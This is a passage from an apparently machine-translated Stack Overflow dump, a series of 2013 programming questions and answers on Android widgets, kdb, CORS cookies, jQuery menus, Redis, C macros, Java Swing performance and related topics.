public class ScheduleWidgetProvider extends AppWidgetProvider {
    {
        Log.w("Schedule", "ScheduleWidgetProviderRequested");
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.w("Schedule", "On recieve " + intent.getAction());
        super.onReceive(context, intent);
    }

    @Override
    public void onEnabled(Context context) {
        Log.w("Schedule", "OnEnabled called");
        ...
        super.onEnabled(context);
    }

    @Override
    public void onDisabled(Context context) {
        Log.w("Schedule", "OnDisabled called");

        ...

        super.onDisabled(context);
    }

    @Override
    public void onUpdate(Context context, AppWidgetManager appWidgetManager, int[] appWidgetIds) {
        for (int i = 0; i < appWidgetIds.length; i++) {
            ....
        }
        super.onUpdate(context, appWidgetManager, appWidgetIds);
    }

} 
```

任何帮助表示赞赏。谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-18T19:09:36.273

好的，从手机中删除我的应用程序就成功了。不明白为什么卸载修复它。对于遇到相同问题的任何人，请卸载并重新安装您的应用程序。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-12-07T19:46:31.960

我知道这是一篇旧帖子，但似乎问题出在`onReceive(Context context, Intent intent)`方法上。

看起来，它优先处理接收者的事件，防止`AppWidgetProvider`' 指定的方法在接收动作时被调用。

有两种可能的解决方案；要么在方法中处理意图的动作`onReceive`，要么删除该方法并覆盖指定的动作方法。

不要忘记在意图过滤器中包含操作。

# kdb - 如何显示 KDB 行大小？

> ID：16091146
> 
> 赞同：4
> 
> 时间：2013-04-18T19:05:30.383
> 
> 标签：kdb

[`count`](http://code.kx.com/q/ref/lists/#count)返回列表或表行的元素数或字符串的长度。有没有办法打印行本身的大小？换句话说，我想知道我在内存中加载的表的大小，而不仅仅是行数。

那么字符串列表的总大小呢？我必须使用[`each`](http://code.kx.com/q/ref/control/#each)来计算所有字符串长度的总和还是有其他方法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T19:16:11.043

取决于您使用的版本。您可以使用

```
q)-22!x / 2.7 or later I believe 
```

或者

```
q)count -8!x 
```

所以

```
q)tbl:([]ids:10?`1;price:10?100.0)
q)count -8!tbl
145
q)count -8!("one";"two";"three")
43
q)count -8!("one";"two";"three";"4")
45 
```

见[http://code.kx.com/q/ref/internal/](http://code.kx.com/q/ref/internal/)

# asp.net-web-api - 不同项目中的WebApi和MVC，共享cookie？

> ID：16091147
> 
> 赞同：2
> 
> 时间：2013-04-18T19:05:30.503
> 
> 标签：asp.net-web-api, cookies, cross-domain

我已将 WebApi 项目分为 MVC 项目 ( [http://mydomain.com](http://mydomain.com) ) 和 WebApi 项目 ( [http://api.mydomain.com](http://api.mydomain.com) )。

我的 MVC 项目只管理身份验证和服务视图（使用 knockoutJS 和 ajax）。

我的问题是，当从 webapi 域（***使用 ajax***）请求信息时，没有发送来自 MVC 项目的 cookie。或者更确切地说，在测试期间，我在不同部分使用了两个 IIS Express 服务器。

该项目将在稍后部署到 Azure，因此任何解决方案都必须在两个网站之间运行。

那么我怎样才能让这些cookies通过呢？还是我应该改用某种令牌？

# 编辑

它一直有效，直到我添加`contentType`到`$.ajax`请求中。然后我得到了 CORS 预检选项。我用我认为正确的标题回答了 200。如果我删除该选项，我会再次收到包含所有 cookie 的工作请求。

**作品**

```
$.ajax({
    url: "http://localhost:54304/Organization/",
    type: "POST",
    data: "$top=10",
    xhrFields: {
        withCredentials: true
    },
    crossDomain: true,
    success: function (data) { console.log(data); }
}); 
```

不工作：

```
$.ajax({
    url: "http://localhost:54304/Organization/",
    contentType: 'application/json', //<--- this triggers preflight
    type: "POST",
    data: "$top=10",
    xhrFields: {
        withCredentials: true
    },
    crossDomain: true,
    success: function (data) { console.log(data); }
}); 
```

现在这是一个 jquery“功能”还是 CORS 的工作原理？我应该设置哪些标题？我试图回复：

```
Access-Control-Allow-Credentials:true
Access-Control-Allow-Origin:http://localhost:51343 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:09:07.130

设置 cookie 时，您还设置了 cookie 应应用于哪些域名。
Cookies 仅依赖于域名（以及可选的路径）；不是在你有什么样的服务器上。

在您的情况下，您可以将域设置为`.mydomain.com`，这是一个将发送到根域和所有子域的通配符 cookie。

# zend-framework2 - Zend 2 TableGateway 难题？

> ID：16091149
> 
> 赞同：0
> 
> 时间：2013-04-18T19:05:42.983
> 
> 标签：zend-framework2

我有这两段代码......在我的脑海中，它们是相同的，但一个有效，一个无效。希望有人能帮我解决这个问题。

此代码不起作用。它返回整个表，忽略 orderby 和限制。

```
public function getNews($limit = null)
{
    $select = new Select();

    $select->order('Date DESC');
    if($limit != null)
    {
        $select->limit($limit);
    }

    $result = $this->gateway->select($select);
    return $result;
} 
```

此代码重新排列以使用匿名函数并且完美运行。

```
public function getNews($limit = null)
{
    $result = $this->gateway->select(
        function(Select $select) use ($limit)
        {
            $select->order('Date DESC');
            if($limit != null)
            {
                $select->limit($limit);
            }
        }
    );

    return $result;
} 
```

任何见解将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T00:58:12.903

第二种方式是如何使用该`TableGateway::select`方法。您可以将一个简单的 where 谓词数组传递给它，或者传递给它，然后对对象`Closure`执行更复杂的操作。`Select`

查看[TableGateway 上的文档以](http://framework.zend.com/manual/2.1/en/modules/zend.db.table-gateway.html#basic-usage)获取更多详细信息。

# jquery - 在jquery的菜单中隐藏和显示列表项？

> ID：16091157
> 
> 赞同：0
> 
> 时间：2013-04-18T19:06:08.940
> 
> 标签：jquery, css

我有一个菜单，其中包含`li`s 中的所有项目。我想要做的是每当`li`s超过5时我想显示“查看更多”选项并隐藏剩余`li`的s并在单击“查看更多”时显示它们并在单击另一个“查看更多”时隐藏`li`它们

这是我的html

```
 <ul class="nav">
    <li><a href="#">Home</a></li>
    <li><a href="#">Categorys</a>
        <div>
            <ul> <a href=""> title="This is an example of a caption"></a></ul>
            <ul>
                <h3>Title1</h3>
                <li data-bind="100002"><a href="#">1</a></li>
                <li data-bind="100028"><a href="#">2</a></li>
            </ul>
            <ul>
                <h3>Title2</h3>
                <li data-bind="100000"><a href="#">1</a></li>
                <li data-bind="100004"><a href="#">2</a></li>
                <li data-bind="100007"><a href="#">3</a></li>
                <li data-bind="100009"><a href="#">4</a></li>
                <li data-bind="100010"><a href="#">5</a></li>//hide from here and show view more option and show them on click
                <li data-bind="100011"><a href="#">6</a></li>
                <li data-bind="100051"><a href="#">7</a></li>
            </ul>
            <ul>
                 <h3>Title3</h3>
                <li data-bind="100103"><a href="#">1</a></li>
                <li data-bind="100105"><a href="#">2</a></li>
                <li data-bind="100115"><a href="#">3</a></li>
                <li data-bind="200071"><a href="#">4</a></li>
                <li data-bind="200072"><a href="#">5</a></li>//hide from here and show view more option and show them on click
                <li data-bind="200073"><a href="#">6</a></li>
                <li data-bind="200043"><a href="#">7</a></li>
                <li data-bind="200044"><a href="#">8</a></li>
                <li data-bind="200045"><a href="#">9</a></li>
                <li data-bind="200046"><a href="#">10</a></li>
                <li data-bind="200047"><a href="#">11</a></li>
                <li data-bind="200048"><a href="#">12</a></li>
            </ul>
        </div>
    </li>
</ul> 
```

这是我想要做的事情的一个jsfiddle：

[提琴手](http://jsfiddle.net/qN59g/)

当`li`s 不超过 5 时，“查看更多”选项不应该存在，并且“查看更多”选项应该被替换为更少，如果我去其他“查看更多”，点击那些应该隐藏的选项并单击打开的应该关闭。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:08:09.933

根据您的 jsfiddle，我执行了以下操作：

```
$('.nav li > div > ul')
  .find('li:gt(4)') //you want :gt(4) since index starts at 0 and H3 is not in LI
  .hide()
  .end()
  .each(function(){
      if($(this).children('li').length > 5){ //iterates over each UL and if they have 5+ LIs then adds Show More...
          $(this).append(
              $('<li>Show More...</li>')
              .addClass('showMore')
              .click(function(){
                  $(this).hide().siblings(':hidden').show();
                  $('.showMore').not(this).show().siblings('li:gt(4)').hide();
              })
          );
     }
  }); 
```

演示：http: [//jsfiddle.net/dirtyd77/qN59g/4/](http://jsfiddle.net/dirtyd77/qN59g/4/)

希望这可以帮助！

***更新***

```
$('.nav li > div > ul')
  .find('li:gt(4)') //you want :gt(4) since index starts at 0 and H3 is not in LI
  .hide()
  .end()
  .each(function(){
      if($(this).children('li').length > 5){ //iterates over each UL and if they have 5+ LIs then adds Show More...
          $(this).append(
              $('<li>Show More...</li>')
              .addClass('showMore')
              .click(function(){
                  if($(this).siblings(':hidden').length > 0){
                      $(this).html('Show Less...').siblings(':hidden').show();
                  }else{
                      $(this).html('Show More...').show().siblings('li:gt(4)').hide();
                  }
              })
          );
     }
  }); 
```

演示：http: [//jsfiddle.net/dirtyd77/qN59g/6/](http://jsfiddle.net/dirtyd77/qN59g/6/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:08:22.960

```
var viewMore = $('<li class="viewmore">Show More...</li>');
var nav = $('ul.nav>li>div>ul');
// only append to those needed
nav.find('>li:gt(4)').hide().parent().append(viewMore);
nav.find('.viewmore').click(function () {
    //hide all outside the limit
    nav.find('>li:gt(4)').hide();
    //show the viewmore - all or them
    nav.find('.viewmore').show();
    // now hide the viewmore and show its siblings
     $(this).hide().siblings().show();
}); 
```

编辑注意：上述工作，但它是序列敏感的。如果您可以使用更新的 jQuery，请使用以下`.on()`代码：

```
var viewMore = $('<li class="viewmore">Show More...</li>');
var nav = $('ul.nav>li>div>ul');
nav.find('>li:gt(4)').hide().parent().append(viewMore);
nav.on('click','.viewmore',function () {
    nav.find('>li:gt(4)').hide();
    nav.find('.viewmore').show();
    $(this).hide().siblings().show();
}); 
```

# memcached - Redis 中 C(n,2) 键的最佳策略

> ID：16091160
> 
> 赞同：1
> 
> 时间：2013-04-18T19:06:24.767
> 
> 标签：memcached, redis

我正在做一个项目，我将向你解释。

我有 N(10000 < N < 100000) 个对象，它们中的每一个都有相互关系，可以表示为一个整数。所以我需要将 C(N,2) 关系存储在数据库中，并且能够尽可能快地随机检索其中的任何一个。

这些关系是通过算法计算出来的。因此，使用不同的算法，我们有不同的关系集。算法正在发生变化，但主动算法将被限制在少于 3 个。

我希望将尽可能多的关系保留在内存中，或者如果随机检索它们比重新计算更快，则保留在磁盘中。

我发现 redis 是最好的尝试，但我们有 20 亿个对象，所以我希望尽可能减少内存使用量。

每个对象和每个算法都由一个 UUID 表示。

我的问题是，最好的策略是什么？我应该使用 redis HashMap 以及如何使用？我应该使用redis vm吗？如何设计密钥（因为如果简单地连接 uuid 就太长了）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T07:03:37.810

如果您无法将所有数据存储在主存中，并且需要使用磁盘，那么 Redis 不是正确的选择。VM 代码在 Redis 2.4 中被弃用，并在 Redis 2.6 中被删除。

此外，存储 UUID 之间的关系也不是特别有效，因为 UUID 不能以单个 64 位整数编码。集合的 Redis 空间优化依赖于对象引用是 64 位整数的事实（通常，关系通过 Redis 的集合实现）。

我认为像 Neo4J 或 OrientDB 这样的图形数据库会更好地为您服务，其目的是存储这种关系。

# matlab - 在matlab图中获得第二行xlabels？

> ID：16091164
> 
> 赞同：0
> 
> 时间：2013-04-18T19:06:35.830
> 
> 标签：matlab

如何在我的下方获得一排标签`xticklabel`？即患者 1、2 3 4？

![在此处输入图像描述](https://i.stack.imgur.com/3vlwV.png) 这显示了如何获取分组标签，但我无法完全解决此示例： [如何在 MATLAB 中调整 3-D 条形分组和 y 轴标签？](https://stackoverflow.com/questions/3601434/how-can-i-adjust-3-d-bar-grouping-and-y-axis-labeling-in-matlab)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:00:11.597

对于您的情况，该函数的用法`text()`如下：

```
text(3,-.1,'Patient1');
text(10,-.1,'Patient2'); 
```

第一个数字是以轴为单位的 x 坐标，第二个数字是 y 坐标。因此，减号表示文本的位置在轴下方。

# ruby-on-rails - ruby on rails，未定义的方法“属于”

> ID：16091166
> 
> 赞同：-3
> 
> 时间：2013-04-18T19:06:43.230
> 
> 标签：ruby-on-rails, ruby, activerecord

我是 ror 新手，我遇到了一个错误

```
class Item < ActiveRecord::Base
  attr_accessible :latitude, :longitude, :photos, :price, :title, :user_id, :category_id
  attr_accessor :user_id, :category_id
  belongs_to :user
  belongs_to :catgory
  reverse_geocoded_by :latitude, :longitude
  after_validation :reverse_geocode
end 
```

调用栈是：

```
ActionController::RoutingError (undefined method `belings_to' for #<Class:0x00000003b1c418>):
app/models/item.rb:5:in `<class:Item>'
app/models/item.rb:1:in `<top (required)>'
app/controllers/item_controller.rb:1:in `<top (required)>' 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:08:43.020

`ActionController::RoutingError (undefined method `belings_to'`

应该是`belongs_to`，检查你的代码

# c - C中常量定义中的常量定义

> ID：16091167
> 
> 赞同：0
> 
> 时间：2013-04-18T19:06:51.790
> 
> 标签：c, constants

我正在尝试在另一个常量定义中使用常量定义，如下所示：

```
#define ADDRESS 5002
#define FIND "foundaddress ADDRESS" 
```

但是当我希望找到常量 FIND 地址 5002 时，这包括 FIND 常量中的 ADDRESS。

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:13:09.327

如果您不介意将 ADDRESS 更改为字符串，则可以使用预处理器连接

```
#define ADDRESS "5002" /* rather than 5002 without quotes */
#define FIND "foundaddress " ADDRESS 
```

编译器会将第二行视为

```
#define FIND "foundaddress 5002" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T19:13:15.873

您需要使用预处理器字符串化运算符将您的值转换为字符串，然后像其他人所说的那样将它们连接起来。

```
#define ADDRESS_TO_STRING(x) #x
#define ADDRESS 5002
#define FIND "foundaddress " ADDRESS_TO_STRING(ADDRESS) 
```

如果这给了您“foundaddress ADDRESS”，则意味着您需要多一层：

```
#define ADDRESS_TO_STRING_(x) #x
#define ADDRESS_TO_STRING(x) ADDRESS_TO_STRING_(x)
#define ADDRESS 5002
#define FIND "foundaddress " ADDRESS_TO_STRING(ADDRESS) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-18T19:09:26.720

是的。

```
#define ADDRESS "5002"
#define FIND "foundaddress " ADDRESS 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-18T19:16:04.510

从[C/C++ 宏字符串连接](https://stackoverflow.com/questions/5256313/c-c-macro-string-concatenation/5256500)

```
/*
 * Turn A into a string literal without expanding macro definitions
 * (however, if invoked from a macro, macro arguments are expanded).
 */
#define STRINGIZE_NX(A) #A

/*
 * Turn A into a string literal after macro-expanding it.
 */
#define STRINGIZE(A) STRINGIZE_NX(A) 
```

然后

```
#define FIND ("foundaddress " STRINGIZE(ADDRESS)) 
```

产生 ("foundaddress " "5002") ，由于 C 的字符串文字连接，它应该可以在您需要字符串文字的任何地方使用。

# php - 如何在 PHP 4 的子域上运行网站的旧部分

> ID：16091183
> 
> 赞同：0
> 
> 时间：2013-04-18T19:07:47.317
> 
> 标签：php, .htaccess

我的全球 PHP 设置为 PHP 5，用于 wordpress 网站。一页指向子域。

我继承了需要在子域上运行 PHP 4 的网站的旧部分。（将在今年晚些时候重建）。

如何将子域的 PHP 版本设置为 PHP 4？

我试过了

```
SetEnv PHP_VER 4
AddHandler php-stable .php 
```

但这导致浏览器显示代码！

希望有人能帮忙！- 谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:10:23.203

这是关于如何在同一服务器上设置 PHP5 和 PHP4 的一个很好的指南：http: [//www.howtoforge.com/apache2_with_php5_and_php4](http://www.howtoforge.com/apache2_with_php5_and_php4)

# java - GUI 运行真的很慢 JAVA

> ID：16091187
> 
> 赞同：2
> 
> 时间：2013-04-18T19:08:09.100
> 
> 标签：java, eclipse, swing, jpanel, listener

所以我又和我的两个朋友一起为学校项目制作了一个小游戏。我们和以前有同样的想法，但现在都是图形化的（JPanel、JLabel 等）。我们有基本的 GUI，但它的运行速度非常慢。当我按箭头键时，它会在 1-2 秒内响应，如果我连续按快速键，则可能需要 15 秒以上。这是代码：

主要的

```
package game;

import java.awt.GridLayout;
import java.io.IOException;

import javax.swing.JFrame;
import javax.swing.JPanel;

public class Gui extends JFrame{
private static final long serialVersionUID = 1L;
int n = 0;
int m = 0;
static MapMake mapMake = new MapMake();
static MapRefresh mapRefresh = new MapRefresh();
static JPanel panel = new JPanel();
static Fighting fighting = null;

public static void main(String[] args) throws IOException {
    Gui frame = new Gui();
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    frame.setTitle("Dungeons and Dragons(and some food)");
    frame.setSize(1280, 720);

    mapMake.setDiscovered(0, 0, 1);
    panel.setLayout(new GridLayout(10, 10, 2, 2));
    mapRefresh.MapRefresh();
    frame.add(panel);
    frame.addKeyListener(new Listener());
    frame.setVisible(true);
}
} 
```

地图制作

```
package game;

public class MapMake{
static int[][] discovered = new int[10][10];
static int[][] content = new int[10][10];
static int heroX = 0;
static int heroY = 0;
public void MapMake(){
    discovered[0][0] = 1;
    for (int row = 0; row < 10; row++) {
        for (int col = 0; col < 10; col++) {
            discovered[row][col] = 0;
        }
    }
    discovered[0][0] = 1;
    int dragon1 = 3;
    int dragon2 = 5;
    int dragon3 = 7;
    int dragon4 = 9;
    int dragon5 = 1;
    int food = 25; // id 6

    while (dragon1 != 0) {
        for (int i = 0; i < 3; i++) {
            for (int j = 0; j < 3; j++) {
                int x = (int) (Math.random() * 2);
                if (x != 1 && dragon1 != 0 && content[i][j] == 0
                        && (i > 0 && i < 3 || j > 0 && j < 3)) {
                    dragon1--;
                    content[i][j] = 1;
                }
            }
        }
    }
    while (dragon2 != 0 && food != 0) {
        for (int i = 0; i < 5; i++) {
            for (int j = 0; j < 5; j++) {
                int x = (int) (Math.random() * 2);
                if (x != 1 && dragon2 != 0 && content[i][j] == 0
                        && (i > 2 && i < 5 || j > 3 && j < 5)) {
                    dragon2--;
                    content[i][j] = 2;
                }
            }
        }
    }
    while (dragon3 != 0) {
        for (int i = 0; i < 7; i++) {
            for (int j = 0; j < 7; j++) {
                int x = (int) (Math.random() * 2);
                if (x != 1 && dragon3 != 0 && content[i][j] == 0
                        && (i > 4 && i < 7 || j > 4 && j < 7)) {
                    dragon3--;
                    content[i][j] = 3;
                }
            }
        }
    }
    while (dragon4 != 0) {
        for (int i = 0; i < 9; i++) {
            for (int j = 0; j < 9; j++) {
                int x = (int) (Math.random() * 2);
                if (x != 1 && dragon4 != 0 && content[i][j] == 0
                        && (i > 6 && i < 9 || j > 6 && j < 9)) {
                    dragon4--;
                    content[i][j] = 4;
                }
            }
        }
    }
    while (dragon5 != 0) {
        for (int i = 0; i < 10; i++) {
            for (int j = 0; j < 10; j++) {
                int x = (int) (Math.random() * 2);
                if (x != 1 && dragon5 != 0 && content[i][j] == 0
                        && (i > 8 && i < 10 || j > 8 && j < 10)) {
                    dragon5--;
                    content[i][j] = 5;
                }
            }
        }
    }
    while (food != 0) {
        for (int i = 0; i < 10; i++) {
            for (int j = 0; j < 10; j++) {
                int x = (int) (Math.random() * 2);
                if (x != 1 && food != 0 && content[i][j] == 0) {
                    food--;
                    content[i][j] = 6;
                }
            }
        }
    }
    discovered[0][0] = 1;
}
public int getDiscovered(int i, int j) {
    return discovered[i][j];
}
public int getContent(int i, int j) {
    return content[i][j];
}
public int getHeroX() {
    return heroX;
}
public int getHeroY() {
    return heroY;
}
public void setDiscovered(int i, int j, int k) {
    MapMake.discovered[i][j] = k;
}
public void setContent(int i, int j, int k) {
    MapMake.content[i][j] = k;
}
public void setHeroX(int heroX) {
    this.heroX = heroX;
}
public void setHeroY(int heroY) {
    this.heroY = heroY;
}
} 
```

地图刷新

```
package game;

import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JLabel;
import javax.swing.JPanel;

public class MapRefresh extends Gui{
static MapMake mapMake = Gui.mapMake;

@SuppressWarnings("unused")
public void MapRefresh() {
    BufferedImage hall = null;
    BufferedImage valge = null;
    JPanel panel = Gui.panel;
    for (int i = 0; i < 10; i++) {
        for (int j = 0; j < 10; j++) {
            //              panel.add(new JButton("" + content[i][j]));
            if (mapMake.getDiscovered(i, j) == 1) {
                panel.add(new JLabel("hero on siin peal"));
            } else if (mapMake.getDiscovered(i, j) == 0) {
                try {
                    panel.add(new JLabel(new ImageIcon(hall = ImageIO.read(new File("C:/hall.jpg")))));
                } catch (IOException e) {
                } catch (NullPointerException e){

                }
            } else {
                try {
                    panel.add(new JLabel(new ImageIcon(valge = ImageIO.read(new File("C:/valge.jpg")))));
                } catch (IOException e) {
                } catch (NullPointerException e){

                }
            }
        }
    }
}
} 
```

和听众

```
package game;

import java.awt.event.*;

import javax.swing.JPanel;

public class Listener extends Gui implements KeyListener{
static MapRefresh mapRefresh = new MapRefresh();
static MapMake mapMake = Gui.mapMake;
static JPanel panel = Gui.panel;
static Fighting fighting = null;
@Override
public void keyPressed(KeyEvent e) {
}

@Override
public void keyReleased(KeyEvent e) {
    int x = mapMake.getHeroX();
    int y = mapMake.getHeroY();
    if (e.getKeyCode() == 37 && y > 0){
        mapMake.setDiscovered(x, y-1, 1);
        mapMake.setDiscovered(x, y, 2);
        mapMake.setHeroY(y - 1);
    } else if(e.getKeyCode() == 38 && x > 0){
        mapMake.setDiscovered(x-1, y, 1);
        mapMake.setDiscovered(x, y, 2);
        mapMake.setHeroX(x - 1);
    } else if (e.getKeyCode() == 39 && y < 9){
        mapMake.setDiscovered(x, y+1, 1);
        mapMake.setDiscovered(x, y, 2);
        mapMake.setHeroY(y + 1);
    } else if (e.getKeyCode() == 40 && x < 9){
        mapMake.setDiscovered(x+1, y, 1);
        mapMake.setDiscovered(x, y, 2);
        mapMake.setHeroX(x + 1);
    }
    int z = mapMake.getContent(x, y);
    panel.removeAll();
    System.out.println(e.getKeyCode());
    mapRefresh.MapRefresh();
    panel.validate();
    panel.repaint();

}

@Override
public void keyTyped(KeyEvent e) {      
}

} 
```

我读到“Try Catch”正在减慢速度。是这样吗？如果是这样，我怎样才能使它变得更好？或者这就像完全的垃圾？

请记住，这是我们的第一个学期！这里也是它的一个 pastebin 副本[http://pastebin.com/VM1cTvyX](http://pastebin.com/VM1cTvyX)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T19:15:18.367

在您的`MapRefresh`类中，每次`MapRefresh`调用该方法时，您最多加载一个图像 100 次 - 2 个嵌套循环，每个循环 10 次迭代。这听起来像是你缓慢的根源。我只会在构造函数中加载这两个图像一次，然后在需要时引用它们。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T19:15:56.133

在我自己看来，问题在于每次按下键时都会加载图像。它在硬盘驱动器上进行一些非常慢的读取操作。

在游戏开始时加载您的资源并稍后使用它们。

对于 try/catch 块，当您到达 catch 块时它会很慢，这会迫使 JVM 构建堆栈跟踪。在这里，您似乎永远无法到达 catch 块。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-18T19:24:25.900

该`MapRefresh()`方法每次更新都会大量加载这些图像。在 MapRefresh 构造函数期间存储一次图像是有益的，如下所示：

```
private ImageIcon imageIcon;

public class MapRefresh extends Gui{
static MapMake mapMake = Gui.mapMake;

imageIcon = new ImageIcon(hall = ImageIO.read(new File("C:/hall.jpg")));

//...
} 
```

然后在添加到面板时只需使用：

```
panel.add(new JLabel(imageIcon)); 
```

您也可以为其他图像重复此操作。这应该允许您使用可以大大提高速度的方法消除“try/catch”块。

# javascript - 哪种是编写内容群体的更好方法？

> ID：16091189
> 
> 赞同：0
> 
> 时间：2013-04-18T19:08:10.213
> 
> 标签：javascript, jquery, html

假设我有 10 个具有唯一 ID 的 div。当我单击每个元素中的一个元素时，我希望显示一个覆盖 div 并根据原始 div 的 ID 在其中填充内容。

这样做更好吗：

```
$('#inventory > div').find('i.icon-plus').on('click', function(){
    $('#add-item').slideDown(100);
    if ( $(this).parent('div').attr('id') == '#id1' ) {
        // load unique template
        // or
        // create form content here
    }
    else if ( $(this).parent('div').attr('id') == '#id2' ) {
        // load other unique template
        // or
        // create other form content here
    }

    ...

    else if ( $(this).parent('div').attr('id') == '#id10' ) {
        // load other unique template
        // or
        // create other form content here
    }
}); 
```

或者：

```
$('#inventory > div#id1').find('i.icon-plus').on('click', function(){
    $('#add-item').slideDown(100);
    // load unique template
    // or
    // create form content here
});
$('#inventory > div#id2').find('i.icon-plus').on('click', function(){
    $('#add-item').slideDown(100);
    // load unique template
    // or
    // create form content here
});

...

$('#inventory > div#id10').find('i.icon-plus').on('click', function(){
    $('#add-item').slideDown(100);
    // load other unique template
    // or
    // create other form content here
}); 
```

?

基本上我要问的是：只有一个带有大量 if/else 语句的事件处理程序更好，还是有大量没有 if/else 语句的事件处理程序更好，或者甚至没有关系？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:24:27.787

我建议您使用[`on`](http://api.jquery.com/on/)将事件处理程序委托给父级，从而避免 jQuery 必须为每个`i.icon-plus`.

然后使用带有 id 的处理程序映射作为运行其相应代码的函数的键。这样，您就不会附加很多 if 语句。

每个“案例”可能包含重复的代码，如果我们知道，可以进一步优化。但是由于我们不知道映射函数的每个块的作用，所以下面是通用代码，它应该服务于相同的目的：

```
//add handles here, with id as the key and a 
//corresponding function that does what its supposed to do
var handles = {
  '#id1' : function(){/*do something*/},
  '#id2' : function(){/*do something*/},
  ...
}

//let's cache this one as well
var addItem = $('#add-item');

$('#inventory > div').on('click','i.icon-plus', function(e){

    //get the corresponding handler
    var handler = handles[$(this).parent('div').attr('id')];

    //return if the handler isn't defined for this id
    if(!handler) return;

    //otherwise, execute. the context and arguments are passed on
    addItem.slideDown(100);
    handler.apply(this,arguments);
}); 
```

*如果*`#inventory > div`我们的[委托目标](http://api.jquery.com/event.delegateTarget/)所引用的 div与 的 div 相同，则可以进一步优化这一点`$(this).parent('div')`。如果是这样，可以替换它以减少函数调用：

```
$(this).parent('div').attr('id')

//can be replaced by

$(e.delegateTarget).attr('id') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T19:21:44.873

Try this:

```
$("#inventory").children("div").on("click", "i.icon-plus", function (e) {
    console.log(e.delegateTarget.id);
    // Do your logic based on e.delegateTarget.id
}); 
```

**DEMO:** [http://jsfiddle.net/7kyGP/](http://jsfiddle.net/7kyGP/)

This binds one event to each of the "parent" (target) `<div>` elements. You use `.parent()` in your code, but you use `.find()` to get the `<i>`. That's kind of contradicting because `.find()` gets descendants...therefore `.parent()` won't necessarily be what you think it is if the `<i>` is nested. With this code, the `<i>` elements don't have to be immediate children - they can be descendants.

Inside the handler, `this` refers to the specific `<i>` element clicked, while `e.delegateTarget` refers to the element that the event is actually bound to - the children `<div>`s of `#inventory`. Of course, you can use jQuery to manipulate the target with `$(e.delegateTarget)`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T19:26:39.213

我怀疑这里有一种更通用的方法 - 如果您可以将所需的数据添加为属性以允许您加载唯一的模板或创建表单内容，那么就不需要大量的 if 语句或多个事件处理程序。

**HTML**

```
<div id="inventory">
    <div id="id1" data-template-url="subform1.htm">
        ... some content
        <i class="icon-plus"></i>
    <div>
    <div id="id2" data-template-url="subform2.htm">
        ... some content
        <i class="icon-plus"></i>
    <div>
    <div id="id3" data-panel-id="panel3">
        ... some content
        <i class="icon-plus"></i>
    <div>
</div>

<div id="panel3" class="hide-until-required">
... panel content
</div> 
```

**JAVASCRIPT**

```
$('#inventory > div').find('i.icon-plus').on('click', function() {
    $('#add-item').slideDown(100);

    var templateUrl = $(this).parent('div').attr('data-panel-id');
    // or 
    var panelId = $(this).parent('div').attr('data-template-url');

    // do something with template or panel data
}); 
```

# c++ - 在 C++/Octave 中绘制 BSpline 曲线

> ID：16091191
> 
> 赞同：0
> 
> 时间：2013-04-18T19:08:25.957
> 
> 标签：c++, math, octave, spline

这可能是一个愚蠢的问题。我有一个 Octave 和 C++

我想绘制 BSpline 曲线。不幸的是，我找不到必要的软件包。有谁知道我如何以某种方式绘制 BSplines。对不起，但我搜索了互联网是徒劳的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:24:06.270

检查以下网址中提到的代码，希望这会有所帮助： [http ://www.planet-source-code.com/vb/scripts/ShowCode.asp?txtCodeId=9222&lngWId=3](http://www.planet-source-code.com/vb/scripts/ShowCode.asp?txtCodeId=9222&lngWId=3)

# c# - .Net DLL 配置文件有一个扭曲

> ID：16091192
> 
> 赞同：0
> 
> 时间：2013-04-18T19:08:31.250
> 
> 标签：c#, java, .net, interop

我有一个调用外部 Web 服务的 .Net 3.5 DLL。该代码使用来自 system.serviceModel 部分的配置文件的绑定配置选项。从 .net 测试应用程序调用时，一切都很好。

当我从基于 Java 的系统调用它并且 DLL 未找到配置文件时，会出现此问题。

现在，我能够使用此方法解决 appSettings 的问题：http: [//www.codeproject.com/Tips/199441/DLL-with-configuration-file](http://www.codeproject.com/Tips/199441/DLL-with-configuration-file)

但是，我没有明确阅读 serviceModel 部分 - .Net 有。

那么，有没有办法“愚弄”.Net 来查找该配置文件？

# same-origin-policy - 同源策略 - 子域和根域

> ID：16091193
> 
> 赞同：16
> 
> 时间：2013-04-18T19:08:39.697
> 
> 标签：same-origin-policy

我有一个关于`same-origin`政策的问题。

我的公司有许多子域，其中一个他们想要一个 iframe，其中包含另一个子域并填充 iframe 的形式。

我已经阅读了有关该`document.domain`属性的信息，并且我需要在所有三个域上进行设置，但是由于每个子域属于不同的部门，我无法轻松地对此进行测试。所以这是我的问题：

当子域都是 https 而根域不是时，这可能吗？我查看了维基百科上的示例，但这对我没有帮助。任何帮助将不胜感激。

**例子：**

```
https://x.company.org
https://y.company.org
http://company.org 
```

